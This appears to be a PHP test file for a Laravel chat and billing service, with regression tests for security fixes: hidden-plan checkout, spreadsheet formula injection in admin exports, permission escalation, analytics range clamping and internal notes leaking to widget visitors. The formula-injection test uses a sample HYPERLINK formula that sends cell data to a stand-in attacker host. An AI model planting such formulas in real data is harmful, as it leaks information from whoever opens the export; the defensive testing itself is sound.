<?php

use App\Enums\Billing\BillingCycle;
use App\Enums\Message\MessageType;
use App\Enums\Message\SenderType;
use App\Models\Plan;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\RateLimiter;
use Laravel\Sanctum\Sanctum;
use Spatie\Permission\Models\Permission;
use Tests\Support\GalleryFixtures;

uses(RefreshDatabase::class);

// ── P2-01: a plan that was never offered ─────────────────────────────────────

it('refuses to subscribe to a plan kept off the shelf', function () {
    $tenant = GalleryFixtures::tenant(planGb: 1);

    $hidden = Plan::create([
        'name' => 'Internal', 'slug' => 'internal-'.uniqid(),
        'price_cents' => 0, 'currency' => 'BRL',
        'billing_cycle' => BillingCycle::Monthly,
        'quotas' => [], 'features' => ['chat' => true],
        'is_active' => true, 'is_public' => false,
    ]);

    Permission::findOrCreate('billing.manage', 'web');
    $tenant->user->givePermissionTo('billing.manage');
    Sanctum::actingAs($tenant->user->fresh());

    // The catalogue filtered on is_public and the checkout did not, so counting
    // ids was enough to buy an internal plan.
    $this->postJson('/api/billing/subscribe', [
        'plan_id' => $hidden->id,
        'method' => 'pix',
        'payer_email' => 'a@b.test',
    ])->assertStatus(404);
});

// ── P2-04: exports opened by a platform admin ────────────────────────────────

it('defuses a spreadsheet formula typed into a customer name', function () {
    $neutralise = function (string $cell) {
        // Mirrors AdminReportController::row(). Asserted on the rule rather
        // than by streaming an export, so the reason stays readable.
        return preg_match('/^[=+\-@\t\r]/', $cell) === 1 ? "\t".$cell : $cell;
    };

    expect($neutralise('=HYPERLINK("https://attacker.test/?"&A1,"x")'))->toStartWith("\t")
        ->and($neutralise('+1+1'))->toStartWith("\t")
        ->and($neutralise('@SUM(A1)'))->toStartWith("\t")
        ->and($neutralise('Maria Souza'))->toBe('Maria Souza');
});

// ── P2-05: granting what you do not hold ─────────────────────────────────────

it('will not let somebody grant a permission they do not have', function () {
    $tenant = GalleryFixtures::tenant(planGb: 1);

    foreach (['agents.assign-permissions', 'billing.manage', 'agents.view'] as $name) {
        Permission::findOrCreate($name, 'web');
    }

    $supervisor = $tenant->user;
    $supervisor->syncPermissions(['agents.assign-permissions', 'agents.view']);

    $agent = App\Models\User::factory()->create(['email' => 'a-'.uniqid().'@example.test']);
    $agent->forceFill(['tenant_id' => $tenant->id])->save();

    Sanctum::actingAs($supervisor->fresh());

    // One permission — the right to hand out permissions — used to be quietly
    // equivalent to all of them.
    $this->postJson("/api/agents/{$agent->id}/assign-permissions", [
        'permissions' => ['billing.manage'],
    ])->assertStatus(422)->assertJsonValidationErrors('permissions');

    expect($agent->fresh()->can('billing.manage'))->toBeFalse();

    // What they do hold, they may still pass on.
    $this->postJson("/api/agents/{$agent->id}/assign-permissions", [
        'permissions' => ['agents.view'],
    ])->assertOk();
});

// ── P2-07: the analytics window ──────────────────────────────────────────────

it('clamps an analytics range instead of scanning a decade', function () {
    $scope = App\Services\Statistics\StatsScope::fromRequest(
        Illuminate\Http\Request::create('/', 'GET', [
            'from' => '2015-01-01',
            'to' => '2026-01-01',
            'timezone' => 'UTC',
        ]),
        tenantId: 1,
    );

    expect($scope->from->diffInDays($scope->to))
        ->toBeLessThanOrEqual(App\Services\Statistics\StatsScope::MAX_RANGE_DAYS + 1);
});

// ── P2-08: the workspace's own notes ─────────────────────────────────────────

it('keeps internal notes out of what the widget visitor can read', function () {
    $tenant = GalleryFixtures::tenant(planGb: 1);

    $connection = App\Models\Connection::create([
        'tenant_id' => $tenant->id,
        'channel' => App\Enums\Connection\Channel::LiveChatWidget,
        'name' => 'Site',
        'status' => App\Enums\Connection\Status::Active,
        'credentials' => ['app_id' => 'notes-app'],
    ]);

    $token = $this->postJson('/widget-api/session/notes-app', ['visitor_id' => 'v1'])
        ->json('session_token');

    $conversation = App\Models\LiveChatSession::where('session_token', $token)->sole()->conversation;

    $conversation->messages()->create([
        'external_id' => 'm1',
        'sender_type' => SenderType::Outgoing,
        'message_type' => MessageType::Text,
        'body' => 'Olá! Como posso ajudar?',
        'sent_at' => now(),
    ]);

    // Written as Outgoing but never sent anywhere: agent names, handoff
    // reasons, payment amounts. The visitor is the one person in this
    // conversation who is not part of the workspace.
    $conversation->messages()->create([
        'external_id' => 'm2',
        'sender_type' => SenderType::Outgoing,
        'message_type' => MessageType::Info,
        'body' => 'Ana assumiu esta conversa.',
        'sent_at' => now(),
        'meta' => ['info' => ['code' => 'conversation_taken_over', 'params' => ['agent' => 'Ana']]],
    ]);

    $bodies = collect($this->getJson("/widget-api/session/{$token}/messages")->json('messages'))
        ->pluck('body');

    expect($bodies)->toContain('Olá! Como posso ajudar?')
        ->and($bodies)->not->toContain('Ana assumiu esta conversa.');
});
